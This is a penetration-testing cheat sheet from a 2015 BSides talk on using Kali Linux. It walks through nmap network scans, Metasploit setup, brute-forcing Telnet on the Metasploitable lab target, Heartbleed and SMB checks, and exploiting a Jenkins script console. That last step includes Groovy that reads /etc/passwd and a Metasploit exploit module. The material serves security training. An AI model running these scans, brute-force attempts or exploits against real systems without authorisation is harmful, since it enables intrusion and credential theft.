Finding Low Hanging Fruit with Kali
===================================
This cheat sheet was developed to accompany the talk Finding Low Hanging Fruit with Kali, which was presented at [Bsides Nashville](http://bsidesnash.org/) in April 2015.

How to Get Kali
---------------
Kali is available for download at http://kali.org/downloads

Setup Kali for First Use
------------------------
Run `apt-get update` to get the latest package lists.

Run `apt-get upgrade` to install the latest packages.

Some packages may be held back, install those packages using `apt-get dist-upgrade` or `apt-get install <package_name>`.

Use `apt-get autoremove` to remove packages that are no longer needed.

Setup Metasploit for First Use
------------------------------
Start the Postgres and Metasploit services

    service postgresql start
    service metasploit start

To have the Postgres and Metasploit services start up at boot time.

    update-rc.d postgresql enable
    update-rc.d metasploit enable

Unnecessary Services
--------------------
TCP scan against 10.1.1.4-254

    nmap 10.1.1.4-254

UDP scan of top ten ports against 10.1.1.4-254

    nmap -sU --top-ports 10 10.1.1.4-254

Use the --open switch to show only the open ports.

    nmap --top-ports 10 --open 10.1.1.4-254

Aggressive scan against 10.1.1.4-254 and save to an XML file.

    nmap -A -oX local_network.xml 10.1.1.4-254

Import the scan results into Metasploit

    msfconsole
    db_import local_network.xml
    hosts
    services
    services -p 23

Finding Weak Passwords
----------------------
Look at the wordlists in the wordlists folder

    cd /usr/share/wordlists
    ls
    gunzip rockyou.txt.gz

Brute-force the Telnet service on Metasploitable

    use auxiliary/scanner/telnet/telnet_login
    show options
    set USERNAME msfadmin
    set PASS_FILE /usr/share/wordlists/fasttrack.txt
    set USER_AS_PASS true
    set BLANK_PASSWORDS true
    services -p 23 -R
    run

Exploitable Vulnerabilities
---------------------------
Find heartbleed vulnerabilities

    nmap -p 443 --script=ssl-heartbleed 10.1.1.4-254

Find SMB vulnerabilities

    nmap --script=smb-check-vulns 10.1.1.4-254  # Unsafe warning
    nmap --script=smb-check-vulns --script-args=unsafe=1 10.1.1.4-254

Web-Based Admin Interfaces
--------------------------
Find the Jenkins interface

    nmap -A -p 80,443,5800,8000,8080 10.1.1.4-254

Once we find Jenkins go to the admin interface and look for the script console.

    proc = [‘cat’, ‘/etc/passwd’].execute()
    println proc.in.text

Metasploit also has a module for this.

    use exploit/multi/http/jenkins_script_console
    show options
    set RHOST 10.1.1.7
    set RPORT 8080
    set TARGETURI /
    show targets
    set TARGET 1
    exploit

Metasploit has a lot of exploits for web interfaces

    search /http/

Online Resources
----------------
[Metasploit Unleashed](http://www.offensive-security.com/metasploit-unleashed/Main_Page)
[Nmap Tutorial](http://www.cyberciti.biz/networking/nmap-command-examples-tutorials/)
